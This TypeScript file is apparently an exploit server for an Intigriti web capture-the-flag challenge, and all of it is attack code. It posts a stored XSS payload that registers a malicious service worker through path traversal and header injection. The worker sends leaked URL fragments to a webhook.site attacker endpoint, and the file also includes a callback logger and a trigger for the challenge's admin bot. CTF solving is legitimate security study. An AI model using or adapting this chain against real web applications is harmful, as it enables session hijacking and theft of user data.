import { Hono } from 'hono'

const app = new Hono()

const CHALL_URI = "https://challenge-0325.intigriti.io"
const ATTACKER_URI = "https://webhook.site/51c21b93-49d7-40ae-99e6-baaea2a7db88"

const sw_inject = `"}});
var document = "";
function $(_x) {
  return { ready: function(_y) { return 0; } }
}
self.addEventListener("fetch", async (e) => {
  const url = new URL(e.request.url);
  if(url.hash.includes(":~:")) await fetch("${ATTACKER_URI}?x="+url.hash.slice(4));
});
const a = () => (() => {
const shit = {a: "`.replaceAll('\n', '')

const payload = `
(async function(){
  await navigator.serviceWorker.register("/view_protected_note?id=../00000-0000-0000-0000-/‥/api/track", { updateViaCache: "all" })
  await fetch("/view_protected_note.js?id=../00000-0000-0000-0000-/‥/api/track", { headers: { "x-user-ip": \`${sw_inject}\` } })
  await navigator.serviceWorker.register("/view_protected_note.js?id=../00000-0000-0000-0000-/‥/api/track", { updateViaCache: "all" })
  location = "/note/x"
})()
`

app.get('/', (c) => {
  return c.html(`
    <script>
      (async function(){
        const sleep = x => new Promise(r => setTimeout(r, x))
        const w = open("${CHALL_URI}/protected-note")
        await sleep(2000)
        const body = {
          title: "1337",
          content: [\`<img src=0 onerror=eval(decodeURIComponent("${encodeURIComponent(payload)}"))>\`],
          use_password: false
        }
        await fetch("${CHALL_URI}/api/post", {
          method: 'POST',
          mode: 'no-cors',
          credentials: 'include',
          body: new Blob([JSON.stringify(body)])
        })
        w.location = "${CHALL_URI}/protected-note?refresh"
        onmessage = (e) => {
          if(e.data.type === "success") {
            location = '${CHALL_URI}/note/' + e.data.noteId
          }
        }
        await sleep(3000)
        w.postMessage({type:"submitPassword",password:""}, '*')
      })()
    </script>
  `)
})

app.get('/r', (c) => {
  console.log(c.req.url)
  return c.text('ok')
})

Bun.serve({
  fetch: app.fetch,
  port: 1337
})

async function visit(url: string) {
  await fetch(`${CHALL_URI}/api/bot`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ url })
  })
}

// await visit(ATTACKER_URI)
